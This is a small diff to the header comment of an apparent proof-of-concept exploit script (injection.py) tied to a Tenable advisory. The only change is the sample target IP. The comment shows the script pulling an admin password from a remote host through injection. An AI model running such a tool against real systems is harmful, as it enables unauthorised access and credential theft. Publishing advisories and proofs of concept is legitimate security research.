@@ -9,7 +9,7 @@
 # Advisory: https://www.tenable.com/security/research/tra-2020-17
 # Sample output:
 #
-# albinolobster@ubuntu:~$ python3 injection.py --rhost 199.30.85.144 --user admin 
+# albinolobster@ubuntu:~$ python3 injection.py --rhost 192.168.0.222 --user admin 
 # [+] Password length is 9
 # [+] Discovering password...
 # LabPass1%
